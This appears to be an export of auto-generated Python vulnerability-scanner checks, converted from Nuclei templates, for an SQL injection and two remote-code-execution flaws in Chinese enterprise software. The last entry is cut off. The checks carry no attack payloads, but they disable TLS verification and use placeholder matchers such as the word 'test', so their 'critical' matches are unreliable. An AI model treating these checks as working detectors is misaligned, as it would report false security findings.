{
  "codeforge_version": "2.1",
  "saved_at": "2026-06-08T10:41:43.951079",
  "library": {
    "functions": [
      {
        "id": "fn_nuclei_c_n_v_d_2023_08743",
        "name": "Hongjing Human Resource Management System - SQL Injection",
        "language": "Python",
        "famille": "WebApp",
        "description": "There is a SQL injection vulnerability in the categories of Hongjing Human Resource Management System, from which attackers can obtain sensitive database information.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code == 200; contains(header,\"text/xml\")",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CNVD-2023-08743\nName: Hongjing Human Resource Management System - SQL Injection\nSeverity: critical\nDescription: There is a SQL injection vulnerability in the categories of Hongjing Human Resource Management System, from which attackers can obtain sensitive database information.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CNVD_2023_08743:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CNVD-2023-08743\"\n    SEVERITY = \"critical\"\n    NAME = \"Hongjing Human Resource Management System - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains(header,\"text/xml\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Hongjing Human Resource Management System - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CNVD_2023_08743(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CNVD-2023-08743\nName: Hongjing Human Resource Management System - SQL Injection\nSeverity: critical\nDescription: There is a SQL injection vulnerability in the categories of Hongjing Human Resource Management System, from which attackers can obtain sensitive database information.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CNVD_2023_08743:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CNVD-2023-08743\"\n    SEVERITY = \"critical\"\n    NAME = \"Hongjing Human Resource Management System - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains(header,\"text/xml\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Hongjing Human Resource Management System - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CNVD_2023_08743(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cnvd2023",
          "cnvd",
          "hongjing",
          "hcm",
          "sqli",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_n_v_d_2023_48562",
        "name": "Chanjet TPlus GetStoreWarehouseByStore - Remote Command Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "Changjet Tplus has a front-end remote code execution vulnerability. An attacker can use the GetStoreWarehouseByStore method to inject a serialized payload and execute arbitrary commands. This ultimately results in leakage of sensitive server information or code execution.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'actorId或archivesId不能为空, \"Type\":\"System.ArgumentException\", Object reference not set to an instance of an object' | mot(s) 'dns'",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "interactsh",
            "datatype": "string",
            "required": false,
            "description": "URL Interactsh OOB"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CNVD-2023-48562\nName: Chanjet TPlus GetStoreWarehouseByStore - Remote Command Execution\nSeverity: critical\nDescription: Changjet Tplus has a front-end remote code execution vulnerability. An attacker can use the GetStoreWarehouseByStore method to inject a serialized payload and execute arbitrary commands. This ultimately results in leakage of sensitive server information or code execution.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CNVD_2023_48562:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CNVD-2023-48562\"\n    SEVERITY = \"critical\"\n    NAME = \"Chanjet TPlus GetStoreWarehouseByStore - Remote Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'actorId或archivesId不能为空, \"Type\":\"System.ArgumentException\", Object reference not set to an instance of an object\\' | mot(s) \\'dns\\''\n\n        # Simple word matcher simulation\n        matchers = ['actorId或archivesId不能为空, \"Type\":\"System.ArgumentException\", Object reference not set to an instance of an object', 'dns']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Chanjet TPlus GetStoreWarehouseByStore - Remote Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CNVD_2023_48562(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CNVD-2023-48562\nName: Chanjet TPlus GetStoreWarehouseByStore - Remote Command Execution\nSeverity: critical\nDescription: Changjet Tplus has a front-end remote code execution vulnerability. An attacker can use the GetStoreWarehouseByStore method to inject a serialized payload and execute arbitrary commands. This ultimately results in leakage of sensitive server information or code execution.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CNVD_2023_48562:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CNVD-2023-48562\"\n    SEVERITY = \"critical\"\n    NAME = \"Chanjet TPlus GetStoreWarehouseByStore - Remote Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'actorId或archivesId不能为空, \"Type\":\"System.ArgumentException\", Object reference not set to an instance of an object\\' | mot(s) \\'dns\\''\n\n        # Simple word matcher simulation\n        matchers = ['actorId或archivesId不能为空, \"Type\":\"System.ArgumentException\", Object reference not set to an instance of an object', 'dns']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Chanjet TPlus GetStoreWarehouseByStore - Remote Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CNVD_2023_48562(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cnvd",
          "cnvd2023",
          "chanjettplus",
          "rce",
          "oast",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_n_v_d__c_2023_76801",
        "name": "UFIDA NC uapjs - Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "There is an arbitrary method calling vulnerability in UFIDA NC and NCC systems. By exploiting the vulnerability through uapjs (jsinvoke), dangerous methods can be called to cause attacks.",
        "severity": "critical",
        "detection": "[OR] DSL: len(body)==0; status_code == 200 / [OR] DSL: contains_all(body,\"Windows\", \"<?xml\", \"DNS\"); status_code == 200 || status_code == 404",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "filename",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: filename",
            "default": "{{rand_base(12)}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CNVD-C-2023-76801\nName: UFIDA NC uapjs - Remote Code Execution\nSeverity: critical\nDescription: There is an arbitrary method calling vulnerability in UFIDA NC and NCC systems. By exploiting the vulnerability through uapjs (jsinvoke), dangerous methods can be called to cause attacks.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CNVD_C_2023_76801:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CNVD-C-2023-76801\"\n    SEVERITY = \"critical\"\n    NAME = \"UFIDA NC uapjs - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: len(body)==0; status_code == 200 / [OR] DSL: contains_all(body,\"Windows\", \"<?xml\", \"DNS\"); status_code == 200 || status_code == 404'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"UFIDA NC uapjs - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CNVD_C_2023_76801(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = 